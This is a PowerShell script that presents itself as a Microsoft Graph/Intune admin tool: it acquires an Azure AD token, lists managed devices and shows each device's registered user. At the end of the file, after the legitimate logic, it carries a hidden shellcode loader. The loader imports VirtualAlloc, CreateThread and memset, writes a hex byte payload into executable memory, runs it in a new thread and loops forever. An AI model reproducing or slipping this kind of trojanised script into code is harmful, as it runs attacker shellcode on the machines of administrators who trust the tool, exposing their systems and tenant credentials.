




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-ManagedDevices(){



[cmdletbinding()]

param
(
    [switch]$IncludeEAS,
    [switch]$ExcludeMDM
)


$graphApiVersion = "beta"
$Resource = "deviceManagement/managedDevices"

try {

    $Count_Params = 0

    if($IncludeEAS.IsPresent){ $Count_Params++ }
    if($ExcludeMDM.IsPresent){ $Count_Params++ }
        
        if($Count_Params -gt 1){

        write-warning "Multiple parameters set, specify a single parameter -IncludeEAS, -ExcludeMDM or no parameter against the function"
        Write-Host
        break

        }
        
        elseif($IncludeEAS){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource"

        }

        elseif($ExcludeMDM){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource`?`$filter=managementAgent eq 'eas'"

        }
        
        else {
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource`?`$filter=managementAgent eq 'mdm' and managementAgent eq 'easmdm'"
        Write-Warning "EAS Devices are excluded by default, please use -IncludeEAS if you want to include those devices"
        Write-Host

        }

        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-ManagedDeviceUser(){



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true,HelpMessage="DeviceID (guid) for the device on must be specified:")]
    $DeviceID
)


$graphApiVersion = "beta"
$Resource = "deviceManagement/manageddevices('$DeviceID')?`$select=userId"

    try {

    $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
    Write-Verbose $uri
    (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).userId

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-AADUser(){



[cmdletbinding()]

param
(
    $userPrincipalName,
    $Property
)


$graphApiVersion = "v1.0"
$User_resource = "users"

    try {

        if($userPrincipalName -eq "" -or $userPrincipalName -eq $null){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

        else {

            if($Property -eq "" -or $Property -eq $null){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName"
            Write-Verbose $uri
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

            }

            else {

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName/$Property"
            Write-Verbose $uri
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

            }

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$ManagedDevices = Get-ManagedDevices

if($ManagedDevices){

    foreach($Device in $ManagedDevices){

    $DeviceID = $Device.id

    write-host "Managed Device" $Device.deviceName "found..." -ForegroundColor Yellow
    Write-Host
    $Device

        if($Device.deviceRegistrationState -eq "registered"){

        $UserId = Get-ManagedDeviceUser -DeviceID $DeviceID

        $User = Get-AADUser $userId

        Write-Host "Device Registered User:" $User.displayName -ForegroundColor Cyan
        Write-Host "User Principle Name:" $User.userPrincipalName

        }

    Write-Host

    }

}

else {

Write-Host
Write-Host "No Managed Devices found..." -ForegroundColor Red
Write-Host

}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xec,0xb8,0x16,0x95,0xc6,0x53,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x46,0x18,0x03,0x46,0x18,0x83,0xc6,0x12,0x77,0x33,0xaf,0xf2,0xf5,0xbc,0x50,0x02,0x9a,0x35,0xb5,0x33,0x9a,0x22,0xbd,0x63,0x2a,0x20,0x93,0x8f,0xc1,0x64,0x00,0x04,0xa7,0xa0,0x27,0xad,0x02,0x97,0x06,0x2e,0x3e,0xeb,0x09,0xac,0x3d,0x38,0xea,0x8d,0x8d,0x4d,0xeb,0xca,0xf0,0xbc,0xb9,0x83,0x7f,0x12,0x2e,0xa0,0xca,0xaf,0xc5,0xfa,0xdb,0xb7,0x3a,0x4a,0xdd,0x96,0xec,0xc1,0x84,0x38,0x0e,0x06,0xbd,0x70,0x08,0x4b,0xf8,0xcb,0xa3,0xbf,0x76,0xca,0x65,0x8e,0x77,0x61,0x48,0x3f,0x8a,0x7b,0x8c,0x87,0x75,0x0e,0xe4,0xf4,0x08,0x09,0x33,0x87,0xd6,0x9c,0xa0,0x2f,0x9c,0x07,0x0d,0xce,0x71,0xd1,0xc6,0xdc,0x3e,0x95,0x81,0xc0,0xc1,0x7a,0xba,0xfc,0x4a,0x7d,0x6d,0x75,0x08,0x5a,0xa9,0xde,0xca,0xc3,0xe8,0xba,0xbd,0xfc,0xeb,0x65,0x61,0x59,0x67,0x8b,0x76,0xd0,0x2a,0xc3,0xbb,0xd9,0xd4,0x13,0xd4,0x6a,0xa6,0x21,0x7b,0xc1,0x20,0x09,0xf4,0xcf,0xb7,0x6e,0x2f,0xb7,0x28,0x91,0xd0,0xc8,0x61,0x55,0x84,0x98,0x19,0x7c,0xa5,0x72,0xda,0x81,0x70,0xee,0xdf,0x15,0xbb,0x47,0xde,0x8e,0x53,0x9a,0xe1,0x41,0xf8,0x13,0x07,0x31,0x50,0x74,0x98,0xf1,0x00,0x34,0x48,0x99,0x4a,0xbb,0xb7,0xb9,0x74,0x11,0xd0,0x53,0x9b,0xcc,0x88,0xcb,0x02,0x55,0x42,0x6a,0xca,0x43,0x2e,0xac,0x40,0x60,0xce,0x62,0xa1,0x0d,0xdc,0x12,0x41,0x58,0xbe,0xb4,0x5e,0x76,0xd5,0x38,0xcb,0x7d,0x7c,0x6f,0x63,0x7c,0x59,0x47,0x2c,0x7f,0x8c,0xdc,0xe5,0x15,0x6f,0x8a,0x09,0xfa,0x6f,0x4a,0x5c,0x90,0x6f,0x22,0x38,0xc0,0x23,0x57,0x47,0xdd,0x57,0xc4,0xd2,0xde,0x01,0xb9,0x75,0xb7,0xaf,0xe4,0xb2,0x18,0x4f,0xc3,0x42,0x64,0x86,0x2d,0x31,0x84,0x1a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

